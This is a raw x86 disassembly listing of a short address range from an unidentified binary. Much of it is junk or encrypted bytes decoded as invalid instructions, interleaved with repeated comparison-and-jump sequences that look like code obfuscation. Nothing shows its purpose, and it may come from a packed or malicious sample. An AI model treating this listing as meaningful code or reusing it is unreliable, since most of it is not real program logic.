  403c30:	sti    
  403c31:	push   ss
  403c32:	cdq    
  403c33:	mov    bl,0x9a
  403c35:	lods   eax,DWORD PTR ds:[esi]
  403c36:	mov    edi,0xc4ee854
  403c3b:	adc    esi,0xffffff80
  403c3e:	fcomp  QWORD PTR [edx+edi*2+0x68d7d142]
  403c45:	in     eax,0x79
  403c47:	int3   
  403c48:	and    al,0x21
  403c4a:	xor    ch,BYTE PTR [esi+ecx*4]
  403c4d:	xor    al,0x1b
  403c4f:	xlat   BYTE PTR ds:[ebx]
  403c50:	sbb    eax,0x599c4d18
  403c55:	dec    edx
  403c56:	lea    esp,[edx+0x9c55323]
  403c5c:	mov    ecx,edx
  403c5e:	push   cs
  403c5f:	push   eax
  403c60:	sahf   
  403c61:	fbstp  TBYTE PTR [edi-0x6706b5cb]
  403c67:	mov    dh,0xe0
  403c69:	adc    DWORD PTR [ecx-0x3d89788b],eax
  403c6f:	into   
  403c70:	jmp    0x403ca3
  403c72:	mov    ebx,0x24c9e461
  403c77:	loopne 0x403c36
  403c79:	arpl   WORD PTR [ebx-0x4d8640dc],cx
  403c7f:	cs nop
  403c81:	and    eax,0x3a624d82
  403c86:	jbe    0x403c30
  403c88:	das    
  403c89:	inc    esp
  403c8a:	pusha  
  403c8b:	ror    BYTE PTR [ebx+0x101839ef],1
  403c91:	icebp  
  403c92:	dec    eax
  403c93:	adc    DWORD PTR [ebp+edi*4+0x6a257122],esp
  403c9a:	dec    eax
  403c9b:	aaa    
  403c9c:	pop    ss
  403c9d:	call   0xd43f5585
  403ca2:	sbb    BYTE PTR [edi+0x129bc5cd],ch
  403ca8:	cs mov cl,0x6e
  403cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cac:	adc    edx,DWORD PTR [edi]
  403cae:	aaa    
  403caf:	sub    ch,BYTE PTR [edi]
  403cb1:	jmp    DWORD PTR [ebx]
  403cb3:	arpl   WORD PTR [eax],sp
  403cb5:	dec    esi
  403cb6:	push   0x74
  403cb8:	dec    ebp
  403cb9:	pushf  
  403cba:	outs   dx,DWORD PTR ds:[esi]
  403cbb:	clc    
  403cbc:	xchg   DWORD PTR [esp+ebp*2+0x25],eax
  403cc0:	mov    ?,edx
  403cc2:	retf   0x5e09
  403cc5:	jge    0x403cf2
  403cc7:	mov    cl,0x7e
  403cc9:	push   0xd55109cd
  403cce:	jge    0x403cc7
  403cd0:	outs   dx,BYTE PTR ds:[esi]
  403cd1:	or     DWORD PTR [bp+si+0x6025],0x54
  403cd7:	imul   BYTE PTR [eax]
  403cd9:	inc    ecx
  403cda:	(bad)  
  403cdb:	pop    esi
  403cdc:	not    DWORD PTR [ebx+0x58]
  403cdf:	sti    
  403ce0:	or     al,0xf8
  403ce2:	push   ecx
  403ce3:	cli    
  403ce4:	iret   
  403ce5:	rol    BYTE PTR [edi+0x12],cl
  403ce8:	push   ecx
  403ce9:	jge    0x403cda
  403ceb:	fwait
  403cec:	ins    BYTE PTR es:[edi],dx
  403ced:	ins    BYTE PTR es:[edi],dx
  403cee:	mov    dl,0xe1
  403cf0:	int    0xe
  403cf2:	xor    ebx,DWORD PTR [ebp-0x3483df2]
  403cf8:	mov    dl,0x25
  403cfa:	or     ebp,esp
  403cfc:	sub    edi,DWORD PTR es:[esi-0x9]
  403d00:	jge    0x403cce
  403d02:	mov    edi,0x40234ab7
  403d07:	add    ebp,DWORD PTR [esi]
  403d09:	push   0x10
  403d0b:	cwde   
  403d0c:	push   ebp
  403d0d:	dec    esp
  403d0e:	call   0x3cbd9e9
  403d13:	rol    DWORD PTR [ecx+0x4247ca25],1
  403d19:	add    BYTE PTR [eax],al
  403d1b:	add    BYTE PTR [eax],al
  403d1d:	add    BYTE PTR [ebx+0x4247ca1d],cl
  403d23:	add    BYTE PTR [ebx-0x77],al
  403d26:	sbb    eax,0x4247ca
  403d2b:	cmp    DWORD PTR ds:0x4247ca,0x1a
  403d32:	jne    0x403d41
  403d38:	push   DWORD PTR [ebp-0xc]
  403d3b:	call   DWORD PTR ds:0x44300c
  403d41:	cmp    DWORD PTR ds:0x4247ca,0x12
  403d48:	jb     0x403d1e
  403d4e:	add    ebx,DWORD PTR ds:0x44898c
  403d54:	imul   edx,edi
  403d57:	mov    edi,DWORD PTR [ebp-0x8]
  403d5a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d5d:	sbb    DWORD PTR ds:0x44b6e0,0x3f1a
  403d67:	sub    ebx,edi
  403d69:	cmp    ebx,edx
  403d6b:	ja     0x403d93
  403d71:	add    edx,DWORD PTR ds:0x41074b
  403d77:	mov    edx,DWORD PTR [ebp-0x4]
  403d7a:	xor    edx,eax
  403d7c:	not    DWORD PTR ds:0x44e40c
  403d82:	add    edx,ecx
  403d84:	mov    DWORD PTR ds:0x44e418,0x3a6f
  403d8e:	jmp    0x4047a2
  403d93:	movzx  ebx,WORD PTR ds:0x44b6d4
  403d9a:	or     DWORD PTR ds:0x448990,ebx
  403da0:	mov    edx,DWORD PTR [ebp-0x2c]
  403da3:	mov    DWORD PTR ds:0x448994,0x16
  403dad:	cmp    DWORD PTR ds:0x448994,0x0
  403db4:	je     0x403e6e
  403dba:	cmp    DWORD PTR ds:0x448994,0x20
  403dc1:	jne    0x403dd5
  403dc7:	push   DWORD PTR [ebp-0x18]
  403dca:	push   0x4107a9
  403dcf:	call   DWORD PTR ds:0x44335c
  403dd5:	mov    ebx,DWORD PTR ds:0x448994
  403ddb:	dec    ebx
  403ddc:	mov    DWORD PTR ds:0x448994,ebx
  403de2:	jmp    0x403dad
  403de7:	and    DWORD PTR ds:0x4247c6,0x0
  403df1:	jmp    0x403e03
  403df6:	mov    ebx,DWORD PTR ds:0x4247c6
  403dfc:	inc    ebx
  403dfd:	mov    DWORD PTR ds:0x4247c6,ebx
  403e03:	cmp    DWORD PTR ds:0x4247c6,0x1c
  403e0a:	jae    0x403e6e
  403e10:	cmp    DWORD PTR ds:0x4247c6,0xc
  403e17:	jne    0x403e4f
  403e1d:	push   DWORD PTR [ebp-0x10]
  403e20:	push   0x1816
  403e25:	push   DWORD PTR [ebp-0x28]
  403e28:	push   0x7e95
  403e2d:	push   0x4109
  403e32:	push   0x336d
  403e37:	push   0x1411
  403e3c:	push   DWORD PTR [ebp-0x20]
  403e3f:	push   0x7b8b
  403e44:	push   0x3268
  403e49:	call   DWORD PTR ds:0x4430d8
  403e4f:	cmp    DWORD PTR ds:0x4247c6,0xb
  403e56:	jne    0x403e69
  403e5c:	mov    ebx,DWORD PTR ds:0x4247c6
  403e62:	inc    ebx
  403e63:	mov    DWORD PTR ds:0x4247c6,ebx
  403e69:	jmp    0x403df6
  403e6e:	mov    edi,DWORD PTR [ebp-0x4]
  403e71:	xor    edx,eax
  403e73:	xor    edi,eax
  403e75:	add    edi,ecx
  403e77:	add    edx,ecx
  403e79:	imul   edx,edi
  403e7c:	mov    edi,DWORD PTR [ebp-0x8]
  403e7f:	mov    ebx,DWORD PTR [ebp-0x10]
  403e82:	sub    ebx,edi
  403e84:	cmp    ebx,edx
  403e86:	ja     0x403e94
  403e8c:	mov    edx,DWORD PTR [ebp-0x28]
  403e8f:	jmp    0x40462f
  403e94:	mov    edx,DWORD PTR [ebp-0x30]
  403e97:	mov    edi,DWORD PTR [ebp-0x4]
  403e9a:	jmp    0x403fff
  403e9f:	dec    ebp
  403ea0:	xchg   esp,eax
  403ea1:	(bad)  
  403ea2:	call   0xa99e390c
  403ea7:	sub    ah,ah
  403ea9:	adc    al,0xc3
  403eab:	(bad)  
  403eac:	idiv   DWORD PTR [eax]
  403eae:	dec    ebx
  403eaf:	pop    esi
  403eb0:	sbb    DWORD PTR [esp+edi*2+0x34],edi
  403eb4:	jg     0x403f32
  403eb6:	jl     0x403e5d
  403eb8:	fstp   DWORD PTR [edx]
  403eba:	jg     0x403e52
  403ebc:	adc    al,0x40
  403ebe:	int3   
  403ebf:	test   eax,0xbe5dff54
  403ec4:	arpl   WORD PTR [edi+ecx*4+0x277ffbb0],si
  403ecb:	mov    bl,BYTE PTR [edi-0x74d77a04]
  403ed1:	cmp    DWORD PTR [esp+eax*8+0x62a4b4fe],eax
  403ed8:	xlat   BYTE PTR ds:[ebx]
  403ed9:	xor    al,0xe3
  403edb:	pop    edx
  403edc:	xor    al,0xfd
  403ede:	xchg   esi,eax
  403edf:	ins    DWORD PTR es:[edi],dx
  403ee0:	dec    ebx
  403ee1:	fdivr  DWORD PTR [edi]
  403ee3:	stos   DWORD PTR es:[edi],eax
  403ee4:	(bad)  
  403ee5:	jnp    0x403ecc
  403ee7:	mov    WORD PTR [ecx],gs
  403ee9:	sub    eax,0xee9c4bc5
  403eee:	stos   DWORD PTR es:[edi],eax
  403eef:	ret    
  403ef0:	je     0x403ead
  403ef2:	sub    cl,0xa8
  403ef5:	cmp    al,0xa9
  403ef7:	imul   ecx,esi,0x27e1e486
  403efd:	cmp    eax,0x96e75b8a
  403f02:	xchg   edx,eax
  403f03:	cwde   
  403f04:	loopne 0x403f4a
  403f06:	pop    ebx
  403f07:	push   cs
  403f08:	stos   DWORD PTR es:[edi],eax
  403f09:	popa   
  403f0a:	dec    ecx
  403f0b:	cmp    bl,BYTE PTR [edi+0x1c8ca41e]
  403f11:	mov    edx,0x1e0291df
  403f16:	retf   0x39be
  403f19:	and    dl,BYTE PTR [edi-0x36f93b5f]
  403f1f:	push   ebx
  403f20:	jg     0x403f98
  403f22:	dec    eax
  403f23:	inc    ecx
  403f24:	into   
  403f25:	bound  ebp,QWORD PTR [edi]
  403f27:	mov    bh,0x7
  403f29:	xor    esp,ebx
  403f2b:	data16 (bad) 
  403f2d:	cmp    eax,0x584e7ba5
  403f32:	pop    esi
  403f33:	cmc    
  403f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f35:	clc    
  403f36:	mov    bl,ah
  403f38:	dec    eax
  403f39:	jno    0x403faa
  403f3b:	hlt    
  403f3c:	adc    eax,0xca843af0
  403f41:	cmc    
  403f42:	sub    al,0xd3
  403f44:	add    ecx,esp
  403f46:	dec    esp
  403f47:	push   ds
  403f48:	sub    ch,BYTE PTR [ecx+0x4c7ea42a]
  403f4e:	sahf   
  403f4f:	(bad)
  403f52:	inc    ebx
  403f53:	add    eax,0xbeac4744
  403f58:	pop    edx
  403f59:	rol    BYTE PTR [ebp+eiz*8+0x34],cl
  403f5d:	out    0x55,eax
  403f5f:	shl    DWORD PTR [ebp+esi*2+0xe],0xef
  403f64:	adc    dl,BYTE PTR [ecx]
  403f66:	in     eax,dx
  403f67:	sbb    DWORD PTR [esi-0x3e],esi
  403f6a:	sub    eax,0x51bb2bde
  403f6f:	div    DWORD PTR [edx+ecx*8-0x28c9ae57]
  403f76:	jecxz  0x403fbd
  403f78:	imul   edx,edx,0x31
  403f7b:	stc    
  403f7c:	sbb    eax,0xf51f6e7f
  403f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f82:	or     al,0x65
  403f84:	sub    al,0x53
  403f86:	dec    esi
  403f87:	ja     0x403fa3
  403f89:	adc    esp,DWORD PTR [edi-0x11]
  403f8c:	mov    ds:0xa7afab3a,eax
  403f91:	inc    eax
  403f92:	push   ecx
  403f93:	sbb    ah,BYTE PTR [ebx+ebx*4+0x2b]
  403f97:	ror    ah,cl
  403f99:	stc    
  403f9a:	or     dh,ch
  403f9c:	lock out 0xa8,al
  403f9f:	xlat   BYTE PTR ds:[ebx]
  403fa0:	mov    dl,0xb9
  403fa2:	or     al,0xd0
  403fa4:	outs   dx,DWORD PTR ds:[esi]
  403fa5:	leave  
  403fa6:	ss jmp 0x95c9fe27
  403fac:	sub    al,0xcd
  403fae:	mov    esi,ecx
  403fb0:	adc    eax,0x214cfe29
  403fb5:	ror    DWORD PTR [edx-0xecddef1],1
  403fbb:	mov    al,0x6b
  403fbd:	enter  0x66ae,0x62
  403fc1:	adc    bh,BYTE PTR [edx]
  403fc3:	sbb    al,0xd7
  403fc5:	mov    eax,0x27ebcc71
  403fca:	outs   dx,BYTE PTR ds:[esi]
  403fcb:	sub    al,0xa9
  403fcd:	sub    al,0x6c
  403fcf:	pop    ebp
  403fd0:	clc    
  403fd1:	(bad)  
  403fd2:	cli    
  403fd3:	adc    al,0x8
  403fd5:	xchg   ebx,eax
  403fd6:	push   ss
  403fd7:	popf   
  403fd8:	mov    edi,0xf295f900
  403fdd:	ds push eax
  403fdf:	and    bh,BYTE PTR [edx+eiz*1]
  403fe2:	adc    al,0x2b
  403fe4:	mov    ss,WORD PTR [edx+0x30]
  403fe7:	cdq    
  403fe8:	icebp  
  403fe9:	enter  0x8c6a,0xc
  403fed:	pop    edx
  403fee:	fstp   QWORD PTR [edi]
  403ff0:	aad    0x86
  403ff2:	loopne 0x403f7c
  403ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ff5:	ss dec edx
  403ff7:	fsubr  st(4),st
  403ff9:	or     eax,0x98970e5b
  403ffe:	mov    BYTE PTR [ebx],dh
  404000:	shl    BYTE PTR [ebx],1
  404002:	clc    
  404003:	add    edi,ecx
  404005:	add    edx,ecx
  404007:	imul   edx,edi
  40400a:	mov    edi,DWORD PTR [ebp-0x8]
  40400d:	mov    ebx,DWORD PTR [ebp-0x10]
  404010:	sub    ebx,edi
  404012:	cmp    ebx,edx
  404014:	ja     0x404022
  40401a:	mov    edx,DWORD PTR [ebp-0x2c]
  40401d:	jmp    0x40462f
  404022:	mov    edx,DWORD PTR [ebp-0x34]
  404025:	mov    edi,DWORD PTR [ebp-0x4]
  404028:	xor    edx,eax
  40402a:	xor    edi,eax
  40402c:	add    edi,ecx
  40402e:	add    edx,ecx
  404030:	imul   edx,edi
  404033:	mov    edi,DWORD PTR [ebp-0x8]
  404036:	mov    ebx,DWORD PTR [ebp-0x10]
  404039:	sub    ebx,edi
  40403b:	cmp    ebx,edx
  40403d:	jmp    0x4041a2
  404042:	sbb    DWORD PTR [edx+ecx*2],esi
  404045:	cs pop ebp
  404047:	mov    ds:0xe1ed77d,al
  40404c:	cmovae ecx,edx
  40404f:	adc    DWORD PTR [edi+0x7c1b164e],0x7c7f347c
  404059:	jl     0x4040ce
  40405b:	cli    
  40405c:	inc    ecx
  40405d:	push   esi
  40405e:	xchg   ebx,eax
  40405f:	jno    0x40409e
  404061:	jnp    0x4040ab
  404063:	push   ds
  404064:	add    ecx,DWORD PTR [ebx+eax*1+0x4e]
  404068:	pushf  
  404069:	test   BYTE PTR [ebp-0x212dc2fa],bl
  40406f:	sbb    ah,0xc0
  404072:	ret    
  404073:	mov    edx,0x6b3057b7
  404078:	out    0x9c,eax
  40407a:	icebp  
  40407b:	xchg   edx,eax
  40407c:	and    bh,bl
  40407e:	sti    
  40407f:	shr    BYTE PTR [ebx+0x4bbae0d0],0xd9
  404086:	and    ebx,DWORD PTR ds:0x8001f417
  40408c:	dec    ecx
  40408d:	aad    0xa2
  40408f:	mov    ch,0x6d
  404091:	add    DWORD PTR [eax-0x28d87e40],eax
  404097:	mov    eax,0x3110be82
  40409c:	clc    
  40409d:	xor    al,0x7f
  40409f:	cdq    
  4040a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040a1:	arpl   WORD PTR [ebx-0x574b62a8],di
  4040a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040a8:	jmp    0x7d5dcd00
  4040ad:	dec    ecx
  4040ae:	jb     0x4040b8
  4040b0:	test   DWORD PTR [edx+0x969a01c],ebx
  4040b6:	xchg   DWORD PTR [edx-0x265fb4a8],esi
  4040bc:	(bad)  
  4040be:	dec    esp
  4040bf:	pop    es
  4040c0:	push   es
  4040c1:	xor    BYTE PTR [ebx+0x50],dh
  4040c4:	dec    ebp
  4040c5:	dec    ecx
  4040c6:	add    ch,BYTE PTR [edi+0x6e]
  4040c9:	das    
  4040ca:	push   ds
  4040cb:	and    BYTE PTR [ebp+0x578ad747],0xf0
  4040d2:	stos   BYTE PTR es:[edi],al
  4040d3:	(bad)  
  4040d4:	xchg   edx,eax
  4040d5:	add    DWORD PTR [eax+0x66f0219f],edi
  4040db:	retf   
  4040dc:	mov    ebx,0xea40060e
  4040e1:	mov    ds,eax
  4040e3:	test   BYTE PTR [ecx-0x7ff41a7a],dl
  4040e9:	das    
  4040ea:	or     eax,0xe6133d08
  4040ef:	xchg   edi,eax
  4040f0:	mov    esp,cs
  4040f2:	fsubr  DWORD PTR [eax+0x55]
  4040f5:	jb     0x4040b8
  4040f7:	mov    ch,0x50
  4040f9:	xor    BYTE PTR [edx-0x69],bh
  4040fc:	mov    ebx,0x50c5fdf6
  404101:	fsubr  QWORD PTR [ebp+0x7d]
  404104:	shl    dl,cl
  404106:	dec    ebx
  404107:	cmp    edx,DWORD PTR ds:0x25deb62
  40410d:	(bad)  
  40410f:	js     0x404181
  404111:	fld    DWORD PTR [ebx+0x5d]
  404114:	jle    0x404190
  404116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404117:	fwait
  404118:	pop    ds
  404119:	ret    
  40411a:	fs pop eax
  40411c:	xchg   ecx,eax
  40411d:	or     ebp,ecx
  40411f:	add    eax,0xc8aa1321
  404124:	push   esp
  404125:	lods   al,BYTE PTR ds:[esi]
  404126:	movntq QWORD PTR [edi-0x68a035ab],mm1
  40412d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40412e:	(bad)  
  40412f:	lea    esi,[ebx]
  404131:	mov    cl,0xbc
  404133:	dec    edx
  404134:	and    BYTE PTR [ebp+0x32],dh
  404137:	(bad)  
  404138:	shl    BYTE PTR [ecx+edi*2-0x14af9767],1
  40413f:	or     ch,BYTE PTR [ebx+0x4d1c6976]
  404145:	(bad)  [esi+0x2b2bc6]
  40414b:	outs   dx,DWORD PTR ds:[esi]
  40414c:	jae    0x40417b
  40414e:	scas   eax,DWORD PTR es:[edi]
  40414f:	retf   0x503f
  404152:	sbb    al,0xca
  404154:	in     eax,dx
  404155:	add    BYTE PTR [esi],al
  404157:	cmp    BYTE PTR [ecx+eiz*2-0x4a],bh
  40415b:	xchg   edx,eax
  40415c:	push   edi
  40415d:	inc    eax
  40415e:	pushf  
  40415f:	lock sti 
  404161:	arpl   WORD PTR [ebp+0x3e],di
  404164:	xor    DWORD PTR [ebx+0x10],edx
  404167:	sub    eax,0xe7993d06
  40416c:	push   0x5d36776b
  404171:	cli    
  404172:	pop    esi
  404173:	jge    0x404142
  404175:	loopne 0x40413e
  404177:	ja     0x40411d
  404179:	dec    esi
  40417a:	jno    0x40419d
  40417c:	mov    ds:0x918da6d3,al
  404181:	aad    0xa4
  404183:	aad    0xa7
  404185:	cdq    
  404186:	adc    DWORD PTR [eax+0x1],0x82953630
  40418d:	fisub  DWORD PTR [ecx-0x51cb673b]
  404193:	add    BYTE PTR [eax],bh
  404195:	sub    ah,cl
  404197:	adc    BYTE PTR [ebp-0x6051579a],dl
  40419d:	lahf   
  40419e:	add    al,0xeb
  4041a0:	push   ebx
  4041a1:	fmul   DWORD PTR [edi]
  4041a3:	xchg   DWORD PTR [eax],ecx
  4041a5:	add    BYTE PTR [eax],al
  4041a7:	add    BYTE PTR [ebx+0x7fe9d055],cl
  4041ad:	add    al,0x0
  4041af:	add    BYTE PTR [ebx+0x7d8bc855],cl
  4041b5:	cld    
  4041b6:	xor    edx,eax
  4041b8:	xor    edi,eax
  4041ba:	jmp    0x40431f
  4041bf:	dec    ecx
  4041c0:	inc    ebx
  4041c1:	fdivr  st,st(0)
  4041c3:	fidivr DWORD PTR [ebx+0x69]
  4041c6:	gs jge 0x40418a
  4041c9:	shr    ebx,cl
  4041cb:	sub    ah,BYTE PTR [esi]
  4041cd:	in     eax,dx
  4041ce:	pop    es
  4041cf:	out    dx,al
  4041d0:	sbb    bh,BYTE PTR [esp+edi*2+0x34]
  4041d4:	jg     0x404252
  4041d6:	jl     0x4041f0
  4041d8:	jmp    0x4041fd
  4041da:	and    DWORD PTR [edi+ebx*2+0xb],0xffffff8c
  4041df:	scas   eax,DWORD PTR es:[edi]
  4041e0:	add    ah,dl
  4041e2:	rcl    DWORD PTR [ebx-0x6d],cl
  4041e5:	into   
  4041e6:	nop
  4041e7:	or     BYTE PTR [ebp+0x46],dl
  4041ea:	push   cs
  4041eb:	and    al,0x5d
  4041ed:	cmp    al,0x46
  4041ef:	lods   eax,DWORD PTR ds:[esi]
  4041f0:	dec    edx
  4041f1:	sub    ah,dl
  4041f3:	cmp    BYTE PTR [ecx],bl
  4041f5:	cdq    
  4041f6:	mov    ebp,0x99c80efb
  4041fb:	jo     0x4041c0
  4041fd:	call   0x87ed3aff
  404202:	push   0xffffff88
  404204:	das    
  404205:	and    BYTE PTR [eax],bh
  404207:	pop    ebp
  404208:	in     al,0x10
  40420a:	fdiv   DWORD PTR [ecx+eiz*1-0x4a]
  40420e:	int3   
  40420f:	jnp    0x40420f
  404211:	cwde   
  404212:	mov    eax,0x4680e471
  404217:	out    0x16,eax
  404219:	mov    ebp,0x901ccd97
  40421e:	cmp    al,BYTE PTR [esi+0x6e]
  404221:	call   0xd546:0xd34e3229
  404228:	adc    esp,ebx
  40422a:	fmul   st(2),st
  40422c:	leave  
  40422d:	xchg   ebx,ebp
  40422f:	adc    al,BYTE PTR [esp+ebp*2+0x0]
  404233:	fisttp QWORD PTR [ecx-0x39d4e0ab]
  404239:	cmc    
  40423a:	out    0x97,al
  40423c:	fcomp  DWORD PTR [edx+0x5d4c7d94]
  404242:	rcr    DWORD PTR [ecx-0x47c88686],1
  404248:	mov    cl,0x42
  40424a:	pop    es
  40424b:	repnz out 0x52,al
  40424e:	not    cl
  404250:	jae    0x40429b
  404252:	or     eax,0xaa02bfe3
  404257:	ja     0x404256
  404259:	int3   
  40425a:	push   0x36013f9f
  40425f:	lea    edx,[esi]
  404261:	xchg   edx,eax
  404262:	test   BYTE PTR [ebx-0x2013a7cc],0xf2
  404269:	clc    
  40426a:	mov    ds:0x2aa7551,al
  40426f:	jecxz  0x4042bd
  404271:	pushf  
  404272:	mov    esp,DWORD PTR [esi+edx*1-0x55]
  404276:	cmc    
  404277:	pop    edx
  404278:	les    eax,FWORD PTR [edx-0x65c7f3c1]
  40427e:	mov    bl,0x27
  404280:	fdiv   DWORD PTR [edi]
  404282:	mov    esp,0x4769ae2d
  404287:	jge    0x4042ca
  404289:	pop    eax
  40428a:	cmc    
  40428b:	or     al,0x88
  40428d:	(bad)  
  40428e:	or     al,0x7c
  404290:	xchg   edx,eax
  404291:	push   edi
  404292:	lds    esi,FWORD PTR [edi-0x39fb67f5]
  404298:	add    DWORD PTR [eax+0x6a4d5076],ecx
  40429e:	push   edx
  40429f:	mov    dh,ah
  4042a1:	test   al,0x55
  4042a3:	xor    al,bh
  4042a5:	pop    ebp
  4042a6:	and    al,0x11
  4042a8:	xchg   BYTE PTR [ebx],dl
  4042aa:	or     al,0x6
  4042ac:	loop   0x4042dc
  4042ae:	pop    ebp
  4042af:	add    al,0x27
  4042b1:	xor    DWORD PTR [edx+0x7605d496],ecx
  4042b7:	ret    
  4042b8:	or     BYTE PTR [ebx],0xcc
  4042bb:	retf   
  4042bc:	fwait
  4042bd:	jae    0x404270
  4042bf:	mov    cl,0x56
  4042c1:	test   DWORD PTR ds:0x515b591d,ebx
  4042c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042c8:	jnp    0x404272
  4042ca:	sub    ecx,edx
  4042cc:	mov    ebx,0xd5e5400d
  4042d1:	fidivr WORD PTR [eax+0x68]
  4042d4:	xlat   BYTE PTR ds:[ebx]
  4042d5:	mov    al,0x95
  4042d7:	rcr    DWORD PTR [edi],cl
  4042d9:	mov    ds:0xef2fd870,al
  4042de:	mov    bl,0x61
  4042e0:	jnp    0x404302
  4042e2:	adc    al,0x29
  4042e4:	push   eax
  4042e5:	loope  0x404294
  4042e7:	or     ebx,DWORD PTR [edx+0x6c975c3d]
  4042ed:	jns    0x4042ca
  4042ef:	cmp    ebp,DWORD PTR [edx+0x1e3b6661]
  4042f5:	aas    
  4042f6:	dec    edx
  4042f7:	mov    DWORD PTR [edx-0x4568342a],ebx
  4042fd:	jbe    0x40429f
  4042ff:	xchg   BYTE PTR [eax],bh
  404301:	repnz out dx,al
  404303:	xor    DWORD PTR [esi-0x689adb4b],esp
  404309:	test   eax,0x4f38e07b
  40430e:	into   
  40430f:	popa   
  404310:	xchg   edx,eax
  404311:	mov    dl,0xf1
  404313:	(bad)  
  404314:	add    al,dl
  404316:	stc    
  404317:	mov    ebx,0x85296c4
  40431c:	les    esi,FWORD PTR [edi+0x71]
  40431f:	add    edi,ecx
  404321:	add    edx,ecx
  404323:	imul   edx,edi
  404326:	mov    edi,DWORD PTR [ebp-0x8]
  404329:	jmp    0x40448e
  40432e:	fwait
  40432f:	bound  esp,QWORD PTR [edi]
  404331:	pushf  
  404332:	stc    
  404333:	ins    DWORD PTR es:[edi],dx
  404334:	fwait
  404335:	jge    0x4042bf
  404337:	les    ecx,FWORD PTR [ebp+0x29]
  40433a:	mov    eax,ds:0xa6dbf863
  40433f:	sbb    eax,0x7f347c7c
  404344:	jl     0x4043c2
  404346:	mov    ebp,0x89b999d8
  40434b:	ficom  DWORD PTR [eax+0x2f965234]
  404351:	sbb    eax,0xc06856e2
  404356:	xchg   edi,eax
  404357:	xor    DWORD PTR [eax+0x5b6d9d81],edx
  40435d:	rcl    DWORD PTR [ebx+0x56011ced],0xca
  404364:	(bad)  
  404365:	daa    
  404366:	jg     0x404373
  404368:	adc    DWORD PTR [ecx-0x2],0xffffffa2
  40436c:	xor    al,0xec
  40436e:	push   edx
  40436f:	vsubpd ymm5,ymm4,ymm5
  404373:	fisttp WORD PTR [ebp+0x62]
  404376:	sub    bh,BYTE PTR [ebp+0x2bb02f66]
  40437c:	adc    BYTE PTR [edx+0x2c06cf84],bh
  404382:	(bad)  
  404383:	pop    esi
  404384:	or     bh,BYTE PTR [ebx]
  404386:	pop    ds
  404387:	rcl    BYTE PTR [ebx-0x16],1
  40438a:	fadd   DWORD PTR [eax+0x4a9ebb12]
  404390:	inc    esi
  404391:	rcl    dl,1
  404393:	xchg   BYTE PTR [edi+0x9],al
  404396:	int    0x22
  404398:	cmp    dh,BYTE PTR [ebx+0x8b3225c]
  40439e:	mov    dl,0xde
  4043a0:	test   eax,0xc16eebfe
  4043a5:	xchg   BYTE PTR [esi+eiz*4+0x2f],ch
  4043a9:	lds    ebp,FWORD PTR [ebx+edi*8]
  4043ac:	or     BYTE PTR [ecx],bl
  4043ae:	and    eax,0x234cb421
  4043b3:	xor    BYTE PTR ds:0x1e41e795,dl
  4043b9:	(bad)  
  4043ba:	push   ebx
  4043bb:	xchg   edx,eax
  4043bc:	hlt    
  4043bd:	sbb    eax,0x81ee2150
  4043c2:	enter  0xa30a,0xdf
  4043c6:	cwde   
  4043c7:	inc    ecx
  4043c8:	pop    edx
  4043c9:	add    eax,edi
  4043cb:	dec    esp
  4043cc:	adc    ebp,DWORD PTR [esp+ebx*1-0x1e]
  4043d0:	xchg   DWORD PTR [ebp+0x72],edi
  4043d3:	call   0x275a:0xb639add8
  4043da:	ins    DWORD PTR es:[edi],dx
  4043db:	(bad)  
  4043dc:	jmp    FWORD PTR [ecx-0x3f]
  4043df:	pop    ss
  4043e0:	cmp    ebx,DWORD PTR [esi]
  4043e2:	mov    al,0xd4
  4043e4:	add    al,0x86
  4043e6:	cmp    BYTE PTR [ebx-0x67],ah
  4043e9:	out    dx,al
  4043ea:	mov    ch,ch
  4043ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043ed:	(bad)  [eax+0x5c]
  4043f0:	jmp    0x6c3b0f0c
  4043f5:	jo     0x4043e5
  4043f7:	jbe    0x404461
  4043f9:	jae    0x4043fe
  4043fb:	mov    esi,0xfc606715
  404400:	psrad  mm1,QWORD PTR [edx-0x3fcf0c0d]
  404407:	xchg   BYTE PTR [ecx+eiz*4+0x25a5b08e],ch
  40440e:	mov    dl,0xa
  404410:	or     BYTE PTR [edx],dh
  404412:	add    ebp,esp
  404414:	clc    
  404415:	mov    edi,0x264cf1d8
  40441a:	outs   dx,BYTE PTR ds:[esi]
  40441b:	sbb    eax,0x925f72cf
  404420:	push   esp
  404421:	outs   dx,BYTE PTR ds:[esi]
  404422:	imul   esp,eax,0x55292ba9
  404428:	pop    edx
  404429:	and    al,0x2a
  40442b:	jb     0x4043ca
  40442d:	lahf   
  40442e:	cli    
  40442f:	inc    esp
  404430:	inc    ecx
  404431:	push   0x8c5b5302
  404436:	jecxz  0x4043ff
  404438:	jnp    0x404469
  40443a:	jns    0x40448b
  40443c:	jo     0x404442
  40443e:	ss pop ecx
  404440:	xor    DWORD PTR [edi-0x6d86509c],esi
  404446:	addr16 pop esp
  404448:	stos   BYTE PTR es:[edi],al
  404449:	push   0xffffff93
  40444b:	add    DWORD PTR [esi+0x1bb76c40],ebx
  404451:	nop
  404452:	cs pop ebp
  404454:	inc    edx
  404455:	pop    es
  404456:	inc    edi
  404457:	retf   0x7246
  40445a:	pusha  
  40445b:	nop
  40445c:	cli    
  40445d:	cmp    DWORD PTR [eax+ebx*1],0x812719d7
  404464:	mov    ds:0x17ea7e5a,eax
  404469:	scas   eax,DWORD PTR es:[edi]
  40446a:	push   ecx
  40446b:	jp     0x404459
  40446d:	ins    BYTE PTR es:[edi],dx
  40446e:	sahf   
  40446f:	addr16 xchg esp,eax
  404471:	pop    edi
  404472:	out    0xb0,eax
  404474:	and    DWORD PTR ss:[esi-0x5f],0x7a
  404479:	inc    eax
  40447a:	mov    eax,ds:0xb7ec3db6
  40447f:	nop
  404480:	cpuid  
  404482:	arpl   WORD PTR [eax-0x64726601],di
  404488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404489:	jmp    0x404484
